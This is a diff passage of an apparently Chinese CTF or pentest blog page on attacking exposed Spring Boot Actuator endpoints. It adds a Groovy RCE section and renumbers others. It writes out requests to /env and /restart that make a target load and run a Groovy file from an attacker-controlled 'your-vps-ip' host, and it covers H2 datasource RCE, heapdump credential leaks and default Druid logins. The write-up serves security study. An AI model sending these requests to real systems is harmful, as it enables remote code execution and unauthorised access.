 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br></pre></td></tr></table></figure>
 
-<p>设置logging.config属性</p>
+<p><strong>设置logging.config属性</strong></p>
 <p>spring 1.x</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">logging.config=http://your-vps-ip/example.groovy</span><br></pre></td></tr></table></figure>
 
@@ -668,7 +795,31 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/common/202408221301162.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/common/202408221301162.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
-<h3 id="17、spring-main-source的groovyRCE-x2F-restart"><a href="#17、spring-main-source的groovyRCE-x2F-restart" class="headerlink" title="17、spring.main.source的groovyRCE  &#x2F;restart"></a>17、spring.main.source的groovyRCE  &#x2F;restart</h3><h3 id="18、spring-datasource-data-基于h2数据库的RCE-x2F-restart"><a href="#18、spring-datasource-data-基于h2数据库的RCE-x2F-restart" class="headerlink" title="18、spring.datasource.data 基于h2数据库的RCE  &#x2F;restart"></a>18、spring.datasource.data 基于h2数据库的RCE  &#x2F;restart</h3><p>1、可以POST请求&#x2F;env接口</p>
+<h3 id="16、spring-main-source的groovyRCE-x2F-restart"><a href="#16、spring-main-source的groovyRCE-x2F-restart" class="headerlink" title="16、spring.main.source的groovyRCE  &#x2F;restart"></a>16、spring.main.source的groovyRCE  &#x2F;restart</h3><p>1、可以 POST 请求目标网站的&#x2F;env&#96;接口设置属性</p>
+<p>2、可以 POST 请求目标网站的&#x2F;restart接口重启应用</p>
+<p>3、目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</p>
+<p>4、HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出</p>
+<p>5、 环境中需要存在 groovy 依赖，否则会导致程序异常退出</p>
+<p><strong>托管groovy文件</strong></p>
+<p>并在里面输入要执行的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><strong>设置 spring.main.sources 属性</strong></p>
+<p>spring 1.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.main.sources=http://your-vps-ip/example.groovy</span><br></pre></td></tr></table></figure>
+
+<p>sping 2.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.main.sources&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>重启应用</strong></p>
+<p>spring 1.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.main.sources&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/common/202408221613971.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/common/202408221613971.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<h3 id="17、spring-datasource-data-基于h2数据库的RCE-x2F-restart"><a href="#17、spring-datasource-data-基于h2数据库的RCE-x2F-restart" class="headerlink" title="17、spring.datasource.data 基于h2数据库的RCE  &#x2F;restart"></a>17、spring.datasource.data 基于h2数据库的RCE  &#x2F;restart</h3><p>1、可以POST请求&#x2F;env接口</p>
 <p>2、可以POST请求&#x2F;restart接口</p>
 <p>3、需要存在h2数据库、spring-boot-starter-data-jpa相关依赖</p>
 <p>4、必须出网，否则会程序异常退出</p>
@@ -698,8 +849,8 @@
 <li>restart 重启应用后，程序会请求设置的 URL 地址</li>
 <li><strong>spring-boot-autoconfigure</strong>组件中的<strong>org.springframework.boot.autoconfigure.jdbc.DataSourceInitializer.java</strong>文件代码逻辑中会使用 runScripts 方法执行请求 URL 内容中的 h2 database sql 代码，造成 RCE 漏洞</li>
 </ol>
-<h3 id="19、heapdump文件下载导致敏感信息泄露"><a href="#19、heapdump文件下载导致敏感信息泄露" class="headerlink" title="19、heapdump文件下载导致敏感信息泄露"></a>19、heapdump文件下载导致敏感信息泄露</h3><p>在Spring Boot中，Heapdump主要用于监控和诊断应用程序的内存使用情况，尤其是在处理内存泄漏、内存溢出（OutOfMemoryError）等内存相关问题时。也就是说可以通过工具获取到heapdump的堆栈信息，操作系统、环境变量还有账号密码等敏感信息。</p>
-<h3 id="20、druid数据连接池"><a href="#20、druid数据连接池" class="headerlink" title="20、druid数据连接池"></a>20、druid数据连接池</h3><p>比较大部分的企业都会嵌入druid数据连接池到springboot项目中，用于监控数据库的操作行为、数据源等。一般常为&#x2F;druid&#x2F;index.html或者&#x2F;druid&#x2F;login.html，容易出现弱口令访问或者未授权访问，账号密码一般是admin&#x2F;123456，若依的则是ruoyi&#x2F;123456</p>
+<h3 id="18、heapdump文件下载导致敏感信息泄露"><a href="#18、heapdump文件下载导致敏感信息泄露" class="headerlink" title="18、heapdump文件下载导致敏感信息泄露"></a>18、heapdump文件下载导致敏感信息泄露</h3><p>在Spring Boot中，Heapdump主要用于监控和诊断应用程序的内存使用情况，尤其是在处理内存泄漏、内存溢出（OutOfMemoryError）等内存相关问题时。也就是说可以通过工具获取到heapdump的堆栈信息，操作系统、环境变量还有账号密码等敏感信息。</p>
+<h3 id="19、druid数据连接池"><a href="#19、druid数据连接池" class="headerlink" title="19、druid数据连接池"></a>19、druid数据连接池</h3><p>比较大部分的企业都会嵌入druid数据连接池到springboot项目中，用于监控数据库的操作行为、数据源等。一般常为&#x2F;druid&#x2F;index.html或者&#x2F;druid&#x2F;login.html，容易出现弱口令访问或者未授权访问，账号密码一般是admin&#x2F;123456，若依的则是ruoyi&#x2F;123456</p>
 <h2 id="0x03总结"><a href="#0x03总结" class="headerlink" title="0x03总结"></a>0x03总结</h2><p>观察这一系列漏洞可以发现，有几个接口是比较常用的</p>
 <p><strong>&#x2F;env</strong> 、**&#x2F;actuator&#x2F;env**</p>
 <p>常用于泄露环境变量、内网地址、用户名密码信息等</p>
